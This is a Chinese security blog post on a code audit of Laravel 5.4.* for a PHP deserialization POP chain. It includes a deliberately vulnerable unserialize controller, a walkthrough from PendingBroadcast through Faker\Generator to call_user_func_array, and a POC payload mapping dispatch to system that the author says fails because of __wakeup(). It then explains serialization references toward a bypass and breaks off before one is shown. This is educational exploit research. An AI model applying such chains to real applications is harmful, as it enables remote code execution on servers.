<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用 | Ho1L0w-By's Blog</title><meta name="keywords" content="代码审计"><meta name="author" content="Ho1L0w-By"><meta name="copyright" content="Ho1L0w-By"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用：本次主要是对Laravel5.4.*的框架进行的代码审计，尝试挖掘其中可利用的POP链。 环境搭建：对于Laravel 5.4.*的环境搭建，这里我主要用到的是Composer，因为Laravel这个框架其实和Composer联系比较深，对于框架都可以用Composer直接一个命令拉出来。 composer create">
<meta property="og:type" content="article">
<meta property="og:title" content="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用">
<meta property="og:url" content="https://ho1l0w-by.github.io/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Ho1L0w-By&#39;s Blog">
<meta property="og:description" content="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用：本次主要是对Laravel5.4.*的框架进行的代码审计，尝试挖掘其中可利用的POP链。 环境搭建：对于Laravel 5.4.*的环境搭建，这里我主要用到的是Composer，因为Laravel这个框架其实和Composer联系比较深，对于框架都可以用Composer直接一个命令拉出来。 composer create">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ho1l0w-by.github.io/img/background.jpg">
<meta property="article:published_time" content="2022-11-25T10:43:57.000Z">
<meta property="article:modified_time" content="2022-11-25T10:46:19.391Z">
<meta property="article:author" content="Ho1L0w-By">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ho1l0w-by.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/Myhead.jpg"><link rel="canonical" href="https://ho1l0w-by.github.io/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-25 18:46:19'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Myhead.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ho1L0w-By's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-25T10:43:57.000Z" title="发表于 2022-11-25 18:43:57">2022-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-25T10:46:19.391Z" title="更新于 2022-11-25 18:46:19">2022-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Laravel-5-4-反序列化-—对冲-wakeup-的RCE链利用："><a href="#Laravel-5-4-反序列化-—对冲-wakeup-的RCE链利用：" class="headerlink" title="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用："></a>Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用：</h1><p>本次主要是对Laravel5.4.*的框架进行的代码审计，尝试挖掘其中可利用的POP链。</p>
<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>对于Laravel 5.4.*的环境搭建，这里我主要用到的是<code>Composer</code>，因为Laravel这个框架其实和Composer联系比较深，对于框架都可以用Composer直接一个命令拉出来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel laravel5.4 &quot;5.4.*&quot;</span><br></pre></td></tr></table></figure>

<p>或者是在github上面下载Releases也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/laravel/laravel</span><br></pre></td></tr></table></figure>

<p>这里的laravel5.4是生成文件名，后面的5.4.*则是版本号。</p>
<p>然后进行一系列操作，参考如下博客：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq78442761/article/details/124537501+">https://blog.csdn.net/qq78442761/article/details/124537501+</a></p>
</blockquote>
<p>接下来还是常规操作，对于路由进行配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">routes/web.php</span><br></pre></td></tr></table></figure>

<p>添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);</span><br></pre></td></tr></table></figure>

<p>然后在Controller，控制器里添加用来反序列化的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app/Http/Controllers/POPController.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line"></span><br><span class="line">class POPController extends Controller&#123;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        if(isset($test))&#123;</span><br><span class="line">            $test = $_GET[&#x27;test&#x27;];</span><br><span class="line">            unserialize($test);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;No Data&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单写一个反序列化函数，能够实现反序列化就可以了，注意一下命名空间。然后注意，写的那个函数名要和路由里的一样。</p>
<p>到这里，环境就已经搭建好了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221115233055641.png" alt="image-20221115233055641"></p>
<h2 id="审计流程："><a href="#审计流程：" class="headerlink" title="审计流程："></a>审计流程：</h2><p>首先还是传统方式，找一个入口，这里直接用Seay进行扫描，生成一个全局的敏感函数的报告。</p>
<p>然后再用Seay自带的查找功能，去找一个合适的<code>__destruct()</code>作为反序列化的入口。</p>
<p><img src="C:\Users\Ho1L0w_By\Downloads\image-20221113001941207.png" alt="image-20221113001941207"></p>
<p>同时也可以找找看__wakeup()函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113004549929.png" alt="image-20221113004549929"></p>
<p>可以看见都挺多的，这里我们首先从__destruct()入手。</p>
<p>这里可以多找找，比如第一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/fzaninotto/faker/src/Faker/Generator.php</span><br></pre></td></tr></table></figure>

<p>这个地方跟进去，可以发现不是入口</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113005142246.png" alt="image-20221113005142246"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113005244737.png" alt="image-20221113005244737"></p>
<p>这里可以看见，seed()函数，就是一个调用随机数的函数，没有看见利用点。</p>
<h2 id="POP链："><a href="#POP链：" class="headerlink" title="POP链："></a>POP链：</h2><p>这里直接看第二个，通过网上的一些资料可以知道这个是有问题的，这里我自己挖掘走一遍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span><br></pre></td></tr></table></figure>

<p>找到destruct()方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113230645145.png" alt="image-20221113230645145"></p>
<p>这里有个dispath方法，关于这个方法，可以从这里看见描述，主要的作用是用于任务推送。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://laravelacademy.org/post/22286">https://laravelacademy.org/post/22286</a></p>
</blockquote>
<p>不过用处不大，可以直接跳过，这里直接看一下<code>$this-&gt;event</code>和<code>$this-&gt;events</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113231555074.png" alt="image-20221113231555074"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113232617278.png" alt="image-20221113232617278"></p>
<p>这里两个变量都只有一个写入值，而且是<code>__construct()</code>方法中的，我们可以控制并调用<code>$events</code>来决定调用哪个类中的<code>dispatch()</code>，同时这里很显然<code>$event</code>的值是我们可以控制的，可以作为跳板，跳转到别的文件中。</p>
<p>这边可以找一下有没有好用的类里有<code>dispatch()</code>作为突破点，一番寻找下来没有看见，那就考虑一下<code>$event</code>。</p>
<p>dispath()这个函数不会进行字符串的输出，所以不能以<code>__toString()</code>作为跳板，这里优先考虑一下，找一个没有<code>dispatch()</code>方法的类，通过这个方式去调用<code>__call()</code>，将<code>$event</code>作为参数，使用Seay进行全局搜索。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113232911732.png" alt="image-20221113232911732"></p>
<p>稍微有点多，87处。</p>
<p>这里我上网找了一下别的师傅的博客，这里大部分师傅都是调用的Generation里的<code>__call()</code>方法。我直接跟进一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113233325138.png" alt="image-20221113233325138"></p>
<p>这里看一下<code>$method</code> 和<code>$attributes</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113234122083.png" alt="image-20221113234122083"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113234135223.png" alt="image-20221113234135223"></p>
<p>可以发现只有一个赋值点，可以控制参数。</p>
<p>这里跟进一下函数<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114003009942.png" alt="image-20221114003009942"></p>
<p><code>$method</code>和<code>$attributes</code>在这里作为<code>call_user_func_array()</code>函数的参数，进行使用。</p>
<p><code>call_user_func_array()</code>这个函数是一个回调函数，格式是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func_array($function,$param[])</span><br></pre></td></tr></table></figure>

<p>其中<code>$function</code>是用于指定调用函数的参数，而<code>$param</code>是作为参数的数组，返回值是布尔值，由回调的函数是否执行成功决定返回true或是false。</p>
<p>在当前函数中，<code>$argument</code>被控制的，而具体函数则是调用<code>getFormatter</code>函数的返回值，跟进一下<code>getFormatter()</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114091736239.png" alt="image-20221114091736239"></p>
<p>这里直接看第一个if就可以了，这个函数没有对输入做更多处理，只要存在输入，就会直接返还。因此可以知道这里是可以直接调用我们想要的函数。</p>
<p>这里就已经构成rce了，通过回调函数<code>call_user_func_array()</code>会造成任意代码执行。</p>
<p>这里总结一下利用逻辑：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114093630794.png" alt="image-20221114093630794"></p>
<h3 id="编写不成功的POC："><a href="#编写不成功的POC：" class="headerlink" title="编写不成功的POC："></a>编写不成功的POC：</h3><p>不成功的POC。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span>  <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$formatters</span> = [<span class="string">&#x27;dispatch&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$a</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>理论上来说，当执行了这个POC之后，就会执行ls命令。</p>
<h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>不过这里会有一个问题，应该是Laravel官方在后续的更新里对这个版本进行了更新，然后通过一个<code>__wakeup()</code>将<code>$formatters</code>置空了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114161405491.png" alt="image-20221114161405491"></p>
<p>也就是说这条链子这里是死了，不能继续调用。</p>
<h3 id="inHann师傅给出的解决思路："><a href="#inHann师傅给出的解决思路：" class="headerlink" title="inHann师傅给出的解决思路："></a>inHann师傅给出的解决思路：</h3><p>但是这里应该还是存在一些解决方案的，当我看见这个__wakeup()的时候，首先考虑到的就是能不能改变对象的数量，然后通过**CVE-2016-7124(__wakeup绕过)**，来进行绕过。</p>
<p>但是这里存在一个问题，对于Laravel 5.4.*，需要的PHP版本需要大于等于5.6.4</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114224508572.png" alt="image-20221114224508572"></p>
<p>而这个CVE的影响范围却是，PHP5&lt;5.6.25，PHP7&lt;7.0.10，因此这个不在CVE使用的范围内。</p>
<p>但是后来我在P神的知识星球里面看到了一篇文章，是inHann师傅给出的思路，这里我尝试用于解决一下5.4.*版本的Laravel的<code>__wakeup()</code>绕过问题。</p>
<blockquote>
<p>原文如下：</p>
<p><a target="_blank" rel="noopener" href="https://inhann.top/2022/05/17/bypass_wakeup/">https://inhann.top/2022/05/17/bypass_wakeup/</a></p>
</blockquote>
<p>这里我还是写一下个人理解以及需要的前置知识。</p>
<p>参考了：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/">https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.neatstudio.com/show-161-1.shtml">https://www.neatstudio.com/show-161-1.shtml</a></p>
</blockquote>
<h4 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h4><p>PHP序列化与反序列化中的数据类型与引用方式（reference)</p>
<p>首先，我们知道在PHP中，使用<code>serialize()</code>函数对对象进行序列化的时候，会使用不同的字母将其中的变量的类型表示出来，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;String&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221118112733601.png" alt="image-20221118112733601"></p>
<p>其中<code>O</code>代表的对象，<code>s</code>代表字符串，<code>i</code>代表整形。</p>
<p>全部类型：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221118113030862.png" alt="image-20221118113030862"></p>
<p>比较常见的类型都是数组之类的，但是其中有两个比较特殊的变量类型，r，R。这两个表示的是引用。</p>
<p>其中r表示的是对象引用，个人理解也可以说是对于标识符的引用。</p>
<p>而R表示的是指针引用，也就是直接引用指向对应内存地址的指针。</p>
<p>或者说：</p>
<p><strong>当两个对象本来就是同一个对象时后出现的对象将会以小写r表示。</strong></p>
<p><strong>而当PHP中的一个对象如果是对另一对象显式的引用，那么在同时对它们进行序列化时将通过大写R表示</strong></p>
<p>两者之间的区别就是，R等于是两个不同的变量名指向了同一块内存（或者说两个不同的变量名里面存了两个不一样的标识符，但是两个标识符都是同时指向同一个内存），因此任何一个变量被改变了，都会影响到所有变量的值。</p>
<p>而r是相当于直接重新开辟了一个内存，只是将值复制过来，然后保存。</p>
<p>第一个是浅拷贝，也就是相当于是PHP序列化中的R。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119140559923.png" alt="image-20221119140559923"></p>
<p>（如果变量a将[1,2,3]进行了更改，那么b的值自然也会进行更改）</p>
<p>第二个是深拷贝，也就是对应的r。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119140642156.png" alt="image-20221119140642156"></p>
<p>（变量a,b相互不影响）</p>
<p>这里我用程序演示一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;first&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&#x27;second&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&#x27;third&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;c = &amp;<span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119144037594.png" alt="image-20221119144037594"></p>
<p>这里需要注意的是，<code>Demo</code>这个类，应当被编号为1，所以第二个输出的结果是<code>r:1</code>。然后<code>$a</code>被标志为2，依次类推。</p>
<p><code>r:1</code>表示的就是引用第一个值，也就是<code>Demo</code>。类似的，<code>r:2</code>就是<code>a</code>的值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SampleClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SampleClass</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;r:1;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SampleClass</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;value = &amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;R:1;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;value = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见在运行了之后，$a只是改变了$value的值，而$b是直接将本身的值改变了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221119151638620.png" alt="image-20221119151638620"></p>
<p>这个就是两者之间的差别。</p>
<p>同时，这种方式有一个特点，即使你不是通过<code>serialize()</code>函数或是<code>Serializable</code>接口进行的正规序列化，而是直接手写一个<code>R:2</code>上去，也同样可以完成对于对象的引用。</p>
<h4 id="利用思想："><a href="#利用思想：" class="headerlink" title="利用思想："></a>利用思想：</h4><p>这里就出现了一个利用方式的思考，因为<code>R</code>方式的引用，可以使得两个不同的变量的值保持相同。</p>
<p>如果可以满足这个步骤：</p>
<ol>
<li>使得被置空的<code>$formatters</code>变量，与某个类中的变量<code>$bypass</code>成为<code>R</code>的指针引用关系。</li>
<li>当<code>$formatters</code>被置空的时候，通过改变<code>$bypass</code>的值，即可对<code>$formatters</code>的值进行修改</li>
<li>在执行<code>getFormatter()</code>之前完成上述操作，就可以成功对冲那个<code>__wakeup()</code>函数了。</li>
</ol>
<p>也就是说，最好能够找到一个赋值语句，且被赋值的语句是类中的成员属性。类似：</p>
